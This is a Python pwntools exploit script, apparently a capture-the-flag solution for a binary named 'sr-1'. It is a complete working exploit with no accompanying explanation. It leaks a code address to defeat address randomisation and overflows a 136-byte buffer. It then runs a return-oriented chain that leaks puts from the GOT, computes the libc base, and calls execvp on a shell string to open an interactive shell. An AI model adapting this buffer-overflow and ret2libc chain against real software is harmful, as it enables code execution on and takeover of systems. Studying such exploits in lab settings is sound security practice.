#!/usr/bin/python

from pwn import *

poprdi = 0x783 #: pop rdi ; ret
poprsi = 0x781 #: pop rsi ; pop r15 ; ret

p = process("./sr-1")
p.sendline("144")
mai = p.recvuntil("P")
mai = mai[-9:-1]
mai = u64(mai)
mai = mai-29
base = mai - 0x6f0

poprdi = base + poprdi
poprsi = base + poprsi
puts = base + 0x500
gotputs = base + 0x201018
print hex(gotputs)
p.sendline("A" * 136  + p64(mai))
p.recv(timeout = 5)
p.sendline("5")
p.recv(timeout = 5)
p.sendline("A" * 136  + p64(poprdi) + p64(gotputs) + p64(puts) + p64(mai))

res = p.recv(timeout=5)
res = res[:6]
res = res + "\x00\x00"
libcbase = u64(res) - 0x6f690

poprdx = libcbase + 0x0000000000001b92
sh = libcbase + 0x11e70
execvp = libcbase + 0xccbc0
p.sendline("5")
p.recv(timeout =5)
p.sendline("A" * 136  + p64(poprdi) + p64(sh) + p64(poprsi) + p64(0)*2 + p64(poprdx) + p64(0) + p64(execvp))
p.interactive()
